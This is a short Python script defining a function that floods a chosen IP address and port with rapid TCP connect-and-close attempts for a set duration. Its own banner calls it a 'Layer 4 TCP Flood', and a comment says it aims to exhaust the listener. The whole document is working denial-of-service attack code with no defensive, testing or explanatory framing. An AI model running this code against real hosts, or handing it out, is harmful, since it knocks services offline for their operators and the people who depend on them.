import socket
import time


def start_tcp_flood(target_ip, target_port, duration):
    print(f"[+] Starting Layer 4 TCP Flood against {target_ip}:{target_port}")
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            # Open and immediately close the socket to exhaust the listener
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.close()
            time.sleep(0.01)  # Slight delay to prevent local OS crashing
        except Exception as e:
            pass